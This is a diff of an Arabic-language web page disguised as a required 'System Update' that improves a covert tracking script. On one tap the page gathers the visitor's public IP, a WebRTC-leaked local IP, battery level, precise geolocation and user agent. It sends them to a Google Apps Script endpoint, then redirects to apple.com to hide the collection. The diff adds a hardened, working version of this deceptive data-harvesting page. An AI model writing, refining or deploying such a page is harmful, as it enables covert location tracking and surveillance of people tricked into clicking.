@@ -1,119 +1,157 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update</title>
-    <style>
-        body { margin: 0; padding: 0; background-color: #f2f2f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 85%; max-width: 320px; }
-        h2 { color: #1c1c1e; margin-top: 0; font-size: 20px; }
-        p { color: #8e8e93; font-size: 14px; margin-bottom: 25px; }
-        button { background: #007aff; color: white; border: none; padding: 14px 0; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        button:active { transform: scale(0.98); opacity: 0.9; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { display: none; color: #34c759; margin-top: 15px; font-weight: bold; font-size: 14px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update</title>
+<style>
+  body { margin:0; padding:16px; background:#f2f2f7;
+         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+         display:flex; justify-content:center; align-items:center; min-height:100dvh; box-sizing:border-box; }
+  .container { text-align:center; background:#fff; padding:30px; border-radius:16px;
+               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:320px; }
+  h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
+  p  { color:#8e8e93; font-size:14px; margin-bottom:25px; }
+  button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
+           border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
+  button:active { transform:scale(.98); opacity:.9; }
+  button[disabled] { opacity:.6; cursor:default; }
+  .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
+            width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  #status { display:none; margin-top:15px; font-weight:700; font-size:14px; }
+  #status.ok  { color:#34c759; display:block; }
+  #status.err { color:#ff3b30; display:block; }
+</style>
 </head>
 <body>
 
 <div class="container">
-    <h2>تحديث النظام مطلوب</h2>
-    <p>يرجى الضغط على الزر التالي لمزامنة بيانات الجهاز وتحديث الإعدادات.</p>
-    
-    <button id="btn" onclick="startTracking()">تحديث الآن</button>
-    
-    <div class="loader" id="loader"></div>
-    <div id="status">✅ تم التحديث بنجاح</div>
+  <h2>تحديث النظام مطلوب</h2>
+  <p>يرجى الضغط على الزر التالي لمزامنة بيانات الجهاز وتحديث الإعدادات.</p>
+
+  <button id="btn" type="button">تحديث الآن</button>
+
+  <div class="loader" id="loader"></div>
+  <div id="status" role="status" aria-live="polite"></div>
 </div>
 
 <script>
-    // ⚠️ تأكد أن الرابط أدناه هو رابط الـ Script الخاص بك (نفس الرابط الذي كان موجوداً)
-    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJLy7uHYErVQI1tNRFgdH3aPzbiHfgL8yM2MXa2G1X6QjDQnERUTbr_YFLjxgA6eIi/exec';
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJLy7uHYErVQI1tNRFgdH3aPzbiHfgL8yM2MXa2G1X6QjDQnERUTbr_YFLjxgA6eIi/exec';
+  const REDIRECT_URL = 'https://www.apple.com';
+  const TIMEOUT = 5000;
 
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            return (await res.json()).ip;
-        } catch (e) { console.error("IP Error", e); return 'N/A'; }
+  const withTimeout = (p, ms, fallback) =>
+    Promise.race([p, new Promise(r => setTimeout(() => r(fallback), ms))]);
+
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+      const data = await res.json();
+      return data.ip || 'N/A';
+    } catch { return 'N/A'; }
+  }
+
+  function getWebRTC() {
+    const p = new Promise(resolve => {
+      if (!window.RTCPeerConnection) return resolve('N/A');
+      let done = false;
+      const finish = v => { if (!done) { done = true; resolve(v); } };
+
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+
+      pc.onicecandidate = e => {
+        if (e.candidate) return;
+        const sdp = pc.localDescription ? pc.localDescription.sdp : '';
+        finish(sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/)?.[0] || 'N/A');
+        pc.close();
+      };
+
+      try {
+        pc.createDataChannel('x');
+        pc.createOffer()
+          .then(o => pc.setLocalDescription(o))
+          .catch(() => finish('N/A'));
+      } catch { finish('N/A'); }
+    });
+    return withTimeout(p, TIMEOUT, 'N/A');
+  }
+
+  async function getBattery() {
+    if (!navigator.getBattery) return 'N/A';
+    try {
+      const b = await navigator.getBattery();
+      return Math.round(b.level * 100) + '%';
+    } catch { return 'N/A'; }
+  }
+
+  function getGeo() {
+    const p = new Promise(resolve => {
+      if (!navigator.geolocation) return resolve('N/A');
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(
+          `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`
+        ),
+        () => resolve('Denied'),
+        { enableHighAccuracy: false, timeout: TIMEOUT, maximumAge: 60000 }
+      );
+    });
+    return withTimeout(p, TIMEOUT + 500, 'N/A');
+  }
+
+  let busy = false;
+
+  async function startTracking() {
+    if (busy) return;
+    busy = true;
+
+    const btn = document.getElementById('btn');
+    const loader = document.getElementById('loader');
+    const status = document.getElementById('status');
+
+    btn.disabled = true;
+    btn.style.display = 'none';
+    loader.style.display = 'block';
+    status.className = '';
+    status.textContent = '';
+
+    try {
+      const [ip, localIP, battery, geo] = await Promise.all([
+        getIP(), getWebRTC(), getBattery(), getGeo()
+      ]);
+
+      const payload = {
+        time: new Date().toISOString(),
+        ip, localIP, battery, location: geo,
+        ua: navigator.userAgent
+      };
+
+      await fetch(GOOGLE_SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+        body: JSON.stringify(payload)
+      });
+
+      loader.style.display = 'none';
+      status.className = 'ok';
+      status.textContent = '✅ تم التحديث بنجاح';
+      setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+
+    } catch (err) {
+      console.error(err);
+      loader.style.display = 'none';
+      status.className = 'err';
+      status.textContent = '⚠️ تعذر الإرسال، تحقق من الاتصال';
+      btn.disabled = false;
+      btn.style.display = 'block';
+      busy = false;
     }
+  }
 
-    async function getWebRTC() {
-        return new Promise(resolve => {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = e => {
-                if (!e.candidate) {
-                    pc.close();
-                    const match = pc.localDescription.sdp.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
-                    resolve(match ? match[0] : 'N/A');
-                }
-            };
-        });
-    }
-
-    async function getBattery() {
-        if (navigator.getBattery) {
-            try {
-                const b = await navigator.getBattery();
-                return Math.round(b.level * 100) + '%';
-            } catch(e) { return 'N/A'; }
-        }
-        return 'N/A';
-    }
-
-    async function startTracking() {
-        const btn = document.getElementById('btn');
-        const loader = document.getElementById('loader');
-        const status = document.getElementById('status');
-
-        if(!btn || !loader || !status) {
-            console.error("Elements not found");
-            return;
-        }
-
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        // جمع البيانات الأساسية
-        let ip = await getIP();
-        let localIP = await getWebRTC();
-        let battery = await getBattery();
-        
-        // محاولة جلب الموقع
-        let location = "Denied";
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // ✅ التصحيح هنا: استخدام Backticks  
-                    location = ${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)};
-                    sendData(ip, localIP, battery, location);
-                },
-                () => {
-                    sendData(ip, localIP, battery, location);
-                },
-                { timeout: 5000 }
-            );
-        } else {
-            sendData(ip, localIP, battery, location);
-        }
-
-        function sendData(ip, locIp, bat, loc) {
-            console.log("Sending data:", { time: new Date(), ip, localIP: locIp, battery: bat, location: loc });
-            
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ time: new Date(), ip, localIP: locIp, battery: bat, location: loc })
-            }).finally(() => {
-                loader.style.display = 'none';
-                status.style.display = 'block';
-                setTimeout(() => window.location.href = 'https://www.apple.com', 2000);
-            });
-        }
-    }
+  document.getElementById('btn').addEventListener('click', startTracking);
 </script>
 
 </body>
